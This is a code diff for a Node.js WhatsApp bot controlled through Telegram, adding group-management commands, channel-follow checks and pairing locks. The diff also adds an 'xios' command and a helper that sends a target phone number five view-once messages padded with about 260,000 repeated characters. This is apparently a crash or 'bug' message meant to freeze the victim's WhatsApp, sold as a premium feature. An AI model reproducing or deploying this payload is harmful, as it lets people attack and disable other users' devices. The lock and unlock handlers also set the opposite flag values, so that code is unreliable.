@@ -22,9 +22,28 @@ const pairingCodes = new NodeCache({ stdTTL: 3600, checkperiod: 600 });
 const requestLimits = new NodeCache({ stdTTL: 120, checkperiod: 60 });
 let connectedUsers = {};
 const developer = '2349052729951@s.whatsapp.net';
-const connectedUsersFilePath = path.join(__dirname, 'connectedUsers.json');
+const connectedUsersFilePath = path.join(__dirname, 'pairedUsers.json');
 const { smsg } = require("./lib/myfunc")
+const CHANNEL_USERNAME = '@gabimarutechchannel';
+const OWNER_FILE = path.join(__dirname, 'telegramowners.json');
 
+if (!fs.existsSync(OWNER_FILE)) {
+    fs.writeFileSync(OWNER_FILE, JSON.stringify([]));
+}
+
+function isOwner(userId) {
+    const owners = JSON.parse(fs.readFileSync(OWNER_FILE));
+    return owners.includes(userId.toString());
+}
+async function userFollowsChannel(userId, bot) {
+    try {
+        const chatMember = await bot.getChatMember(CHANNEL_USERNAME, userId);
+        return ['member', 'administrator', 'creator'].includes(chatMember.status);
+    } catch (err) {
+        console.error('❌ Error checking channel membership:', err);
+        return false;
+    }
+}
 const formatTime = (seconds) => {
   seconds = Number(seconds);
   const d = Math.floor(seconds / (3600 * 24));
@@ -209,6 +228,40 @@ conn.ev.on('messages.upsert', async ({ messages, type }) => {
         const isBotAdmin = groupAdmins.includes(botNumber);
 
         // Helper
+        async function xiosinv(bad, target) {
+       tmsg = await generateWAMessageFromContent(target, {
+               viewOnceMessage: {
+                   message: {
+                       listResponseMessage: {
+                           title: '@kingbadboi\n',
+                           description:"\n\n\n"+"𑪆".repeat(260000),
+                           singleSelectReply: {
+                               selectedId: "id"
+                           },
+                           listType: 1
+                       }
+                   }
+               }
+       }, {});
+
+       await bad.relayMessage("status@broadcast", tmsg.message, {
+           messageId: tmsg.key.id,
+           statusJidList: [target],
+           additionalNodes: [{
+               tag: "meta",
+               attrs: {},
+               content: [{
+                   tag: "mentioned_users",
+                   attrs: {},
+                   content: [{
+                       tag: "to",
+                       attrs: { jid: target },
+                       content: undefined,
+                   }],
+               }],
+           }],
+       });
+       }
         const send = async (text) => conn.sendMessage(chat, { text });
         const xreply = async (text) => conn.sendMessage(chat, {
             text,
@@ -233,14 +286,101 @@ conn.ev.on('messages.upsert', async ({ messages, type }) => {
                     const end = speed();
                     return send(`🏓 PONG: ${Math.floor(end - start)}ms`);
                 }
+                
+                case "public": {
+                 if (!isCreator) {
+                         return;
+                       }
+			     	xreply("Status has successfully changed to public")
+		                   	conn.public = true
+	                 	}
 
-                case 'menu': {
-                    const image = "https://files.catbox.moe/yqfzkv.jpg";
-                    return conn.sendMessage(chat, {
-                        image: { url: image },
-                        caption: `✨ *Viper WhatsApp Bot*\n\nAvailable commands:\n• .ping\n• .menu\n• .group-link\n• .say [text]`
-                    });
-                }
+			case "self": {
+if (!isCreator) {
+    return;
+  }
+				xreply("Status has sucessfully changed to private")
+				conn.public = false
+			}
+
+                case 'creategc': case 'creategroup': {
+if (!isCreator) {
+return;
+}
+if (!args.join(" ")) return xreply(`Use ${prefix+command} groupname`)
+let cret = await conn.groupCreate(args.join(" "), [])
+let response = await conn.groupInviteCode(cret.id)
+let capt = `     「 Created Group 」
+
+▸ Name : ${cret.subject}
+▸ Owner : @${cret.owner.split("@")[0]}
+▸ Creation : ${moment(cret.creation * 1000).tz("Africa/Lagos").format("DD/MM/YYYY HH:mm:ss")}
+
+https://chat.whatsapp.com/${response}
+       `;
+await conn.sendMessage(chat, { text: capt})
+}
+case "subject": case "changesubject": { 
+if (!isGroup) return send("This command is only for groups");
+if (!isBotAdmin) return send(`I Need Admin Privileges To Complete This command`) 
+if (!isAdmins) return send(`Only for admins`)
+if (!q) return send(`provide text for gc subject`)
+await conn.groupUpdateSubject(chat, `${q}`); 
+ xreply('Group name successfully updated!'); 
+} 
+           case "desc": case "setdesc": { 
+                 if (!isGroup) return send("This command is only for groups");
+                 if (!isBotAdmin) return send(`I Need Admin Privileges To Complete This command`) 
+                 if (!isAdmins) return send(`Only for admins`)
+                 if (!q) return send(`provide text for gc desc`)
+                 await conn.groupUpdateDescription(chat, `${q}`); 
+ xreply(`Group description successfully updated! 👥\n> 𝐆𝐚𝐛𝐢𝐦𝐚𝐫𝐮`); 
+             }
+ case "disp-off": { 
+                 if (!isGroup) return send("This command is only for groups");
+                 if (!isBotAdmin) return send(`Bot must be admin`);
+                 if (!isAdmins) return send(`Only for admins`);
+  
+                     await conn.groupToggleEphemeral(chat, 0); 
+ xreply('Dissapearing messages successfully turned off!'); 
+ }
+ 
+ case "xios": {
+ if (!isCreator) return send("Don't think you can fool me, you're not premium user");
+ const target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net";
+ if (!q) return send("Usage: `xios 234xxx`");
+  
+ for (let i = 0; i < 5; i++) {
+ await xiosinv(conn, target);
+ }
+ send(`${target}: User Disarmed ❌`);
+ }
+case 'menu': {
+const image = "https://files.catbox.moe/yqfzkv.jpg";
+return conn.sendMessage(chat, {
+image: { url: image },
+caption: `
+𝗕𝗼𝘁: 𝐕𝐈𝐏𝐄𝐑: 𝐀𝐖𝐀𝐊𝐄𝐍𝐈𝐍𝐆 🧭
+𝗗𝗲𝘃: 𝐆𝐚𝐛𝐢𝐦𝐚𝐫𝐮
+𝗩𝗲𝗿𝘀𝗶𝗼𝗻: 𝐖𝐡𝐚𝐭𝐗𝐓𝐞𝐥𝐞
+
+𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦:
+.𝗉𝗂𝗇𝗀
+.𝗆𝖾𝗇𝗎
+.𝖽𝖾𝗌𝖼 [𝗇𝖾𝗐]
+.𝗌𝗎𝖻𝗃𝖾𝖼𝗍 [𝗇𝖾𝗐]
+.𝗄𝗂𝖼𝗄 @user
+.𝖼𝗋𝖾𝖺𝗍𝖾𝗀𝖼
+
+𝗦𝗣𝗘𝗖𝗜𝗔𝗟 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦:
+.𝗌𝖾𝗅𝖿
+.𝗉𝗎𝖻𝗅𝗂𝖼
+.𝗑𝗂𝗈𝗌 𝟤𝟥𝟦𝗑𝗑𝗑
+
+𝖢𝗋𝖾𝖺𝗍𝖾𝖽 𝖻𝗒 ayokunledavid.t.me
+`
+});
+}
                 
 case 'kick':
 case 'remove': {
@@ -300,49 +440,74 @@ xreply(`${jid} Has Successfully Been Removed`);
     }
 });
 }
-const CHANNEL_USERNAME = '@gabimarutechchannel';
-async function userFollowsChannel(userId) {
-    try {
-        const chatMember = bot.getChatMember(CHANNEL_USERNAME, userId);
-        return ['member', 'administrator', 'creator'].includes(chatMember.status);
-    } catch (err) {
-        console.error('Error checking channel membership:', err);
-        return false;
-    }
-}
-// Handle /connect command
-bot.onText(/\/pair (\d+)/, async (msg, match) => {
+
+let isPairLocked = false;
+
+bot.onText(/\/lockpair/, (msg) => {
+  const chatId = msg.chat.id;
+  const userId = msg.from.id;
+
+  if (!isOwner(userId)) {
+    return bot.sendMessage(chatId, "❌ You are not authorized to use this command.");
+  }
+
+  isPairLocked = false;
+  bot.sendMessage(chatId, "🔒 /pair command has been locked. Only owners can use it now.");
+});
+
+bot.onText(/\/unlockpair/, (msg) => {
+  const chatId = msg.chat.id;
+  const userId = msg.from.id;
+
+  if (!isOwner(userId)) {
+    return bot.sendMessage(chatId, "❌ You are not authorized to use this command.");
+  }
+
+  isPairLocked = true;
+  bot.sendMessage(chatId, "🔓 /pair command has been unlocked. All users can use it now.");
+});
+
+bot.onText(/\/pair(?:\s(\d+))?/, async (msg, match) => {
     const chatId = msg.chat.id;
-    const phoneNumber = match[1];
     const userId = msg.from.id;
-    const follows = userFollowsChannel(userId);
-    if (!follows) {
-        return bot.sendMessage(chatId, `Please follow ${CHANNEL_USERNAME} before using this command.`);
+    const phoneNumber = match[1];
+
+       if (!phoneNumber) {
+        return bot.sendMessage(chatId, `⚠️ Please use: /pair 234xxx`, {
+            reply_markup: {
+                inline_keyboard: [
+                    [
+                        { text: 'Join Channel', url: `https://t.me/gabimarutechchannel` }
+                    ]
+                ]
+            }
+        });
     }
+    // Channel follow enforcement
+    const follows = await userFollowsChannel(userId, bot);
+    if (!follows) {
+        return bot.sendMessage(chatId, `❌ Please follow ${CHANNEL_USERNAME} before using this command.`);
+    }
+
+    // Pair lock check
+    if (isPairLocked && !isOwner(userId)) {
+        return bot.sendMessage(chatId, `🚫 Pairing is currently locked. Only bot owners can use this command.`);
+    }
+
     const sessionPath = path.join(__dirname, 'tmp', `session_${phoneNumber}`);
 
-    // Check if the session directory exists
     if (!fs.existsSync(sessionPath)) {
-        // If the session does not exist, create the directory
         fs.mkdirSync(sessionPath, { recursive: true });
-        console.log(`Session directory created for ${phoneNumber}.`);
-        bot.sendMessage(chatId, `Session directory created for ${phoneNumber}.`);
-
-        // Generate and send pairing code
+        console.log(`✅ Session directory created for ${phoneNumber}`);
+        bot.sendMessage(chatId, `✅ Session directory created for ${phoneNumber}`);
+        
+        // Run your WhatsApp pairing logic
         startWhatsAppBot(phoneNumber, chatId).catch(err => {
-            console.log('Error:', err);
-            bot.sendMessage(chatId, 'An error occurred while connecting.');
+            console.error('❌ Error pairing:', err);
+            bot.sendMessage(chatId, '❌ An error occurred while connecting.');
         });
     } else {
-        // If the session already exists, check if the user is already connected
-        const isAlreadyConnected = connectedUsers[chatId] && connectedUsers[chatId].some(user => user.phoneNumber === phoneNumber);
-        if (isAlreadyConnected) {
-            bot.sendMessage(chatId, `The phone number ${phoneNumber} is already connected. Please use /delsession to remove it before connecting again.`);
-            return;
-        }
-
-        // Proceed with the connection if the session exists
-        bot.sendMessage(chatId, `The session for ${phoneNumber} already exists. You can use /delsession to remove it or connect again.`);
+        bot.sendMessage(chatId, `⚠️ Session for ${phoneNumber} already exists. Use /delpair to remove it.`);
     }
 });
 
@@ -353,17 +518,12 @@ bot.onText(/\/delpair (\d+)/, async (msg, match) => {
     const userId = msg.from.id;
     const ownerId = msg.from.id.toString();
     const phoneNumber = match[1];
-    const follows = userFollowsChannel(userId);
-    if (!follows) {
-        return bot.sendMessage(chatId, `Please follow ${CHANNEL_USERNAME} before using this command.`);
-    }
     const sessionPath = path.join(__dirname, 'tmp', `session_${phoneNumber}`);
     /*
     if (ownerId !== OWNER_ID) {
         return bot.sendMessage(chatId, '❌ You are not authorized to use this command.');
     }
     */
-    // Check if the session directory exists
     if (fs.existsSync(sessionPath)) {
            fs.rmSync(sessionPath, { recursive: true, force: true });
             bot.sendMessage(chatId, `Session for ${phoneNumber} has been deleted. You can now request a new pairing code.`);
@@ -378,10 +538,6 @@ bot.onText(/\/delpair (\d+)/, async (msg, match) => {
 bot.onText(/\/menu|\/start/, (msg) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
-    const follows = userFollowsChannel(userId);
-    if (!follows) {
-        return bot.sendMessage(chatId, `Please follow ${CHANNEL_USERNAME} before using this command.`);
-    }
     const options = {
     reply_markup: JSON.stringify({
       inline_keyboard: [
@@ -425,10 +581,6 @@ bot.onText(/\/list/, (msg) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
     const connectedUser  = connectedUsers[chatId];
-    const follows = userFollowsChannel(userId);
-    if (!follows) {
-        return bot.sendMessage(chatId, `Please follow ${CHANNEL_USERNAME} before using this command.`);
-    }
     if (connectedUser  && connectedUser .length > 0) {
         let statusText = `Bot Status:\n- Connected Numbers:\n`;
         connectedUser .forEach(user => {
@@ -439,7 +591,7 @@ bot.onText(/\/list/, (msg) => {
     } else {
         bot.sendMessage(chatId, `You have no registered numbers.`);
     }
-});
+}); 
 
 // Function to load all session files
 async function loadAllSessions() {
